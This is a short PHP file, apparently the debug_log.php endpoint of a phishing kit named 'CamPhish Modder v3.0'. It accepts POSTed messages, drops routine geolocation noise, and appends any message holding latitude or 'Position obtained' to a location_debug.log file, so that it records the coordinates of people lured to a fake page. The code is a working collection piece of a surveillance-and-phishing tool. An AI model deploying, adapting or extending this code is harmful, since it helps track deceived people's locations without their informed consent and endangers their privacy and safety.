<?php
// CamPhish Modder v3.0 - debug_log.php (stable, กัน spam)
header('Content-Type: application/json');

if (!isset($_POST['message'])) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'No message provided']);
    exit;
}

$message = substr((string)$_POST['message'], 0, 500);
$message = str_replace(["\r", "\n"], ' ', $message);
$date = date('Y-m-d H:i:s');

$filtered_messages = [
    "Location data sent",
    "getLocation called",
    "Geolocation error",
    "Location permission denied"
];

foreach ($filtered_messages as $phrase) {
    if (strpos($message, $phrase) !== false) {
        echo json_encode(['status' => 'success', 'filtered' => true]);
        exit;
    }
}

if (strpos($message, 'Lat:') !== false ||
    strpos($message, 'Latitude:') !== false ||
    strpos($message, 'Position obtained') !== false) {
    @file_put_contents("location_debug.log", "[$date] $message\n", FILE_APPEND | LOCK_EX);
}

echo json_encode(['status' => 'success']);
exit;
